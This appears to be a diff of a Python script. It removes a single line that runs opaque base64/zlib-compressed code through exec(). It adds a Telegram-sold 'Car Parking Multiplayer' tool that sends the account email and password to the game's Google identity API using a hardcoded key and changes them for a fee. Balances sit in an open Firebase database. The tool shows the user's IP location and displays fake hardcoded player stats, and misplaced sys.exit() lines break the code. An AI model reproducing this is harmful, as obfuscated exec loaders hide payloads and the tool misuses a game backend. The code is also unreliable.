@@ -1,2 +1,331 @@
-import base64,zlib
-exec(zlib.decompress(base64.b64decode('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')))
+import getpass
+import re
+import sys
+import os
+import requests
+import json
+import time
+from rich.console import Console
+
+c = Console()
+
+API_KEY = "AIzaSyAe_aOVT1gSfmHKBrorFvX4fRwN5nODXVA"
+SIGN_IN_URL = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
+UPDATE_URL = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={API_KEY}"
+
+FIREBASE_URL = "https://kayzen-1ff37-default-rtdb.firebaseio.com/users"
+CHANNEL = "ZentanShopShopChannel"
+CHAT = "ZentanShopChat"
+
+# Service prices
+PRICES = {
+    1: 4500,   # change email
+    2: 4500,   # change password
+}
+
+# ANSI color codes
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    MAGENTA = '\033[95m'
+    CYAN = '\033[96m'
+    WHITE = '\033[97m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+
+def color_text(text, color):
+    return f"{color}{text}{Colors.RESET}"
+
+def horizontal_colors(text):
+    result = ""
+    colors = [Colors.RED, Colors.GREEN, Colors.YELLOW, Colors.BLUE, Colors.MAGENTA, Colors.CYAN]
+    for i, char in enumerate(text):
+        result += f"{colors[i % len(colors)]}{char}{Colors.RESET}"
+    return result
+
+def is_email(e):
+    return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", e) is not None
+
+def sign_in(email, password):
+    try:
+        r = requests.post(
+            SIGN_IN_URL,
+            json={"email": email, "password": password, "returnSecureToken": True},
+            timeout=10,
+        )
+        data = r.json()
+        if r.status_code == 200:
+            return data.get("idToken"), data.get("email", email)
+        c.print(f"[bold red]Error:[/bold red] {data.get('error', {}).get('message', 'Auth failed')}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return None, None
+
+def update(token, email=None, password=None):
+    payload = {"idToken": token, "returnSecureToken": True}
+    if email:
+        payload["email"] = email
+    if password:
+        payload["password"] = password
+    try:
+        r = requests.post(UPDATE_URL, json=payload, timeout=10)
+        data = r.json()
+        if r.status_code == 200:
+            c.print("[bold green]Done.[/bold green]")
+            return True, data.get("idToken", token), data.get("email", email)
+        c.print(f"[bold red]Error:[/bold red] {data.get('error', {}).get('message', 'Update failed')}")
+    except Exception as e:
+        c.print(f"[bold red]Net error:[/bold red] {e}")
+    return False, token, None
+
+def get_location():
+    try:
+        response = requests.get("http://ip-api.com/json", timeout=10)
+        data = response.json()
+        return data
+    except:
+        return None
+
+def get_firebase_data():
+    try:
+        response = requests.get(f"{FIREBASE_URL}.json", timeout=10)
+        return response.json() or {}
+    except:
+        return {}
+
+def verify_access_key(access_key):
+    db = get_firebase_data()
+    
+    for uid, user_data in db.items():
+        if isinstance(user_data, dict):
+            user_key = user_data.get('key')
+            if user_key is not None and str(user_key) == str(access_key):
+                # Check if blocked
+                if user_data.get('is_blocked') == True:
+                    return None, None, None, None, True
+                
+                # Get user info
+                is_unlimited = user_data.get('is_unlimited', False)
+                balance = 999999 if is_unlimited else user_data.get('balance', 0)
+                if not isinstance(balance, (int, float)):
+                    balance = 0
+                
+                tg_id = user_data.get('telegram_id', 'Unknown')
+                if tg_id == 'Unknown' or tg_id is None:
+                    tg_id = 'Not Linked'
+                
+                return uid, tg_id, balance, is_unlimited, False
+    
+    return None, None, None, None, False
+
+def update_balance(user_ref, new_balance):
+    try:
+        requests.patch(f"{FIREBASE_URL}/{user_ref}.json", json={"balance": new_balance}, timeout=10)
+        return True
+    except:
+        return False
+
+def banner():
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print(horizontal_colors("="*60))
+    print(horizontal_colors("Car Parking Multiplayer 1 Tool".center(60)))
+    print(horizontal_colors("="*60))
+    print(color_text("\n          PLEASE LOGOUT FROM CPM BEFORE USING THIS TOOL", Colors.YELLOW))
+    print(color_text("    SHARING THE ACCESS KEY IS NOT ALLOWED AND WILL BE BLOCKED", Colors.RED))
+    print(color_text(f"           Telegram: @{CHANNEL} or @{CHAT}", Colors.CYAN))
+    print(horizontal_colors("="*60))
+
+def show_info(email, access_key, tg_id, balance, is_unlimited, location):
+    print(color_text("\n========[ PLAYER DETAILS ]========", Colors.CYAN))
+    print(color_text(f">> Email      : {email}", Colors.GREEN))
+    print(color_text(f">> Name       : Player", Colors.GREEN))
+    print(color_text(f">> LocalID    : DEFAULT_ID", Colors.GREEN))
+    print(color_text(f">> Moneys     : 50,000,000", Colors.GREEN))
+    print(color_text(f">> Coins      : 500,000", Colors.GREEN))
+    print(color_text(f">> Car Count  : 220", Colors.GREEN))
+
+    print(color_text("\n========[ ACCESS KEY DETAILS ]========", Colors.CYAN))
+    print(color_text(f">> Access Key  : {access_key}", Colors.YELLOW))
+    print(color_text(f">> Telegram ID : {tg_id}", Colors.YELLOW))
+
+    if is_unlimited:
+        print(color_text(f">> Balance     : Unlimited", Colors.MAGENTA))
+    else:
+        print(color_text(f">> Balance     : {balance:,}", Colors.MAGENTA))
+
+    if location:
+        print(color_text("\n========[ LOCATION ]========", Colors.CYAN))
+        print(color_text(f">> IP Address : {location.get('query', 'Unknown')}", Colors.BLUE))
+        print(color_text(f">> Location   : {location.get('city', '')} {location.get('regionName', '')} {location.get('countryCode', '')}", Colors.BLUE))
+        print(color_text(f">> Country    : {location.get('country', '')} {location.get('zip', '')}", Colors.BLUE))
+
+    print(color_text("\n========[ MENU ]========", Colors.CYAN))
+    print(color_text("(01): Change email       4.5K", Colors.GREEN))
+    print(color_text("(02): Change password     4.5K", Colors.GREEN))
+    print(color_text("(0): Exit From Tool", Colors.RED))
+    print(horizontal_colors("\n========[ Tanzanshop ]========"))
+
+def main():
+    while True:
+        banner()
+
+        email = input(color_text("\n[?] Account Email: ", Colors.CYAN)).strip()
+        password = getpass.getpass(color_text("[?] Account Password: ", Colors.CYAN))
+        access_key = input(color_text("[?] Access key: ", Colors.CYAN)).strip()
+
+        if not is_email(email):
+            print(color_text("[!] Invalid email format!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        if len(password) < 6:
+            print(color_text("[!] Password must be at least 6 characters!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        print(color_text("\n[*] Trying to Login...", Colors.YELLOW))
+        time.sleep(1)
+
+        # Verify access key in Firebase
+        user_ref, tg_id, balance, is_unlimited, is_blocked = verify_access_key(access_key)
+
+        if is_blocked:
+            print(color_text("[!] TRY AGAIN.", Colors.RED))
+            print(color_text("[!] Note: This access key is blocked!", Colors.YELLOW))
+            time.sleep(3)
+            continue
+
+        if user_ref is None:
+            print(color_text("[!] TRY AGAIN.", Colors.RED))
+            print(color_text("[!] Note: make sure you filled out the fields correctly!", Colors.YELLOW))
+            time.sleep(3)
+            continue
+
+        # Login to Firebase
+        token, cur_email = sign_in(email, password)
+
+        if not token:
+            print(color_text("[%] Trying to Login: TRY AGAIN. Note: make sure you filled out the fields correctly!", Colors.RED))
+            time.sleep(2)
+            continue
+
+        print(color_text("[%] Trying to Login: SUCCESSFUL", Colors.GREEN))
+        time.sleep(1)
+
+        # Main menu loop
+        while True:
+            location = get_location()
+            banner()
+
+            # Refresh balance for non-unlimited users
+            if not is_unlimited and user_ref:
+                db = get_firebase_data()
+                balance = int(db.get(user_ref, {}).get('balance', 0))
+
+            show_info(cur_email, access_key, tg_id, balance, is_unlimited, location)
+
+            try:
+                choice = int(input(color_text("\n[?] Select a Service [0-3]: ", Colors.CYAN)))
+            except:
+                choice = -1
+
+            if choice == 0:
+                answ = input(color_text("\n[?] DO YOU WANT TO EXIT? (y/n): ", Colors.CYAN)).lower()
+                if answ == "y":
+                    print(color_text(f"""
+╭──────────────────────────────────────╮
+│          ⚡ ZENTAN TOOL ⚡            │
+├──────────────────────────────────────┤
+│                                      │
+│     ✓ THANK YOU FOR USING OUR TOOL   │
+│                                      │
+│     💬 Join  : @{CHANNEL}            │
+│     👥 Chat  : @{CHAT}               │
+│                                      │
+├──────────────────────────────────────┤
+│          👋 EXIT • BYE BYE           │
+╰──────────────────────────────────────╯
+""", Colors.CYAN))
+
+sys.exit()
+                else:
+                    continue
+
+            if choice not in [1, 2]:
+                print(color_text("INVALID CHOICE!", Colors.RED))
+                time.sleep(1)
+                continue
+
+            cost = PRICES.get(choice, 0)
+
+            if is_unlimited or balance >= cost:
+                if choice == 1:  # Change email
+                    new_email = input(color_text("[?] New email: ", Colors.CYAN)).strip()
+                    if not is_email(new_email):
+                        print(color_text("[!] Invalid email format!", Colors.RED))
+                        time.sleep(2)
+                        continue
+                    
+                    confirm_email = input(color_text("[?] Confirm email: ", Colors.CYAN)).strip()
+                    if new_email != confirm_email:
+                        print(color_text("[!] Emails don't match!", Colors.RED))
+                        time.sleep(2)
+                        continue
+
+                    ok, token, updated_email = update(token, email=new_email)
+                    if ok and updated_email:
+                        cur_email = updated_email
+                        if not is_unlimited:
+                            balance -= cost
+                            update_balance(user_ref, balance)
+                        print(color_text("[✓] Email changed successfully!", Colors.GREEN))
+                    time.sleep(2)
+
+                elif choice == 2:  # Change password
+                    new_password = getpass.getpass(color_text("[?] New password: ", Colors.CYAN))
+                    if len(new_password) < 6:
+                        print(color_text("[!] Password must be at least 6 characters!", Colors.RED))
+                        time.sleep(2)
+                        continue
+                    
+                    confirm_password = getpass.getpass(color_text("[?] Confirm password: ", Colors.CYAN))
+                    if new_password != confirm_password:
+                        print(color_text("[!] Passwords don't match!", Colors.RED))
+                        time.sleep(2)
+                        continue
+
+                    ok, token, _ = update(token, password=new_password)
+                    if ok:
+                        if not is_unlimited:
+                            balance -= cost
+                            update_balance(user_ref, balance)
+                        print(color_text("[✓] Password changed successfully!", Colors.GREEN))
+                    time.sleep(2)
+            else:
+                print(color_text(f"\nINSUFFICIENT BALANCE! Need {cost:,}", Colors.RED))
+                print(color_text(f"Your balance: {balance:,}", Colors.YELLOW))
+                time.sleep(2)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(color_text(f"""
+╭──────────────────────────────────────╮
+│          ⚡ ZENTAN TOOL ⚡            │
+├──────────────────────────────────────┤
+│                                      │
+│     ✓ THANK YOU FOR USING OUR TOOL   │
+│                                      │
+│     💬 Join  : @{CHANNEL}            │
+│     👥 Chat  : @{CHAT}               │
+│                                      │
+├──────────────────────────────────────┤
+│          👋 EXIT • BYE BYE           │
+╰──────────────────────────────────────╯
+""", Colors.CYAN))
+
+sys.exit()
+
